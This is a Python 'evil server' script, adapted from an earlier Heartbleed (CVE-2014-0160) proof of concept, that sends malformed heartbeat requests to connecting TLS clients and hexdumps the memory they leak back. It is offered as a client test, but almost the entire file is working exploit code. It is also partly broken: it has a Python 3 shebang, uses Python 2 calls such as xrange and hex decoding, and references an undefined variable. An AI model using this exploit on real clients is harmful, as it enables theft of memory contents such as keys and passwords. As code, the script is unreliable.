#!/usr/bin/env python3

# OpenSSL Heartbleed vulnerability "evil server" by Amanda Gray
# Based on the...
# # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# # The author disclaims copyright to this source code.

import sys
import struct
import socket
import time
import select
import re
import ssl
from optparse import OptionParser

options = OptionParser(usage='%prog myservername [options]', description='Evil Server: Test for SSL heartbeat vulnerability (CVE-2014-0160) against clients')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')
options.add_option('-c', '--certfile', type='string', default='sslcert.crt', help='Certfile generated for this server')
options.add_option('-k', '--keyfile', type='string', default='sslcert.key', help='Keyfile generated for this server')

# From jspenguin

# The following is all python 2 !!
def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

# Server Hello needs to be built (0x02) if we want to try to force
# heartbeat on a client that didn't ask for it.
# using [15] = "heartbeat", ?? as the extension, ie, 0f

# hb_tlsv1 = h2bin(''' 
    #    18 03 01 00 03
    #    01 40 00
#    ''')

hb = b'\x18\x03\x02\x00\x03\x01\x40\x00'

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print("  %04x: %-48s %s" % (b, hxdat, pdat))
    print

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print("Unexpected EOF receiving record header - server closed connection")
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print('No heartbeat response received, server likely not vulnerable')
            return False

        if typ == 24:
            print('Received heartbeat response:')
            hexdump(pay)
            if len(pay) > 3:
                print('WARNING: server returned more data than it should - server is vulnerable!')
            else:
                print('Server processed malformed heartbeat, but did not return any extra data.')
            return True

        if typ == 21:
            print('Received alert:')
            hexdump(pay)
            print('Server returned error, likely not vulnerable')
            return False

# Adapted from python.org example SSL server: https://docs.python.org/2/library/ssl.html#server-side-operation

def main():

    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    if opts.debug:
        print("Setup server: %s, certfile: %s, keyfile: %s" % (args[0], opts.certfile, opts.keyfile))

    bindsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bindsocket.bind((args[0], opts.port))
    bindsocket.listen(5)

    # accept() gets the new socket from the other end, 
    # wrap_socket() to create a server-side SSL context for it:
    bContinue = True
    while bContinue:
        try:
            newsocket, fromaddr = bindsocket.accept()
            if opts.debug:
                print("bindsocket.accept() from (%s, %s)" % (newsocket, fromaddr))
            connstream = ssl.wrap_socket(newsocket,
                                         server_side=True,
                                         certfile=opts.certfile,
                                         keyfile=opts.keyfile,
                                         ssl_version=ssl.PROTOCOL_TLSv1_1, # PROTOCOL_TLSv1, # This should be OK for desktop client
                                         do_handshake_on_connect = False);
            print("connstream handshake completed")
            try:
                deal_with_client_ori(connstream)
            except (KeyboardInterrupt, SystemExit):
                bContinue = False
            finally:
                connstream.shutdown(socket.SHUT_RDWR)
                connstream.close()
        except (KeyboardInterrupt, SystemExit):
            bContinue = False
        except Exception:
            print("received exception: %s\n%s\n%s" % (sys.exc_info()))
    sys.stdout.flush()

# Read data from connstream until finished with the client (or client is finished with you)

def deal_with_client(connstream):
    print("Just connected. Did we get a Client Hello?")

    while False: # was True; maybe we skip the Client Hello part...
        typ, ver, pay = recvmsg(connstream)
        if typ == None:
            print("Client closed connection without sending Client Hello.")
            return
        # Look for client hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    # Now send a Server Hello message...
    print("Sending Server Hello...")
    connstream.send(hello)

    #supposed to send the Certificate now?
    print("Sending heartbeat request...")
    sys.stdout.flush()
    connstream.send(hb)
    hit_hb(connstream)


def deal_with_client_ori(connstream):
    #    data = connstream.read()
    data = True
    # null data means the client is finished with us    
    while data:
        if not do_something(connstream, data):
            # we'll assume do_something returns False
            # when we're finished with client
            break
        data = connstream.read()
    # finished with client

def do_something(connstream, data):
    print("%s" % data)

    # hit it up with heartbeats even if we didn't actually say we were going to...
    print("Sending heartbeat request...")
    sys.stdout.flush()
    connstream.send(hb)
    #    connstream.send(hb_tlsv1)
    hit_hb(connstream)

    return False

if __name__ == '__main__':
    main()
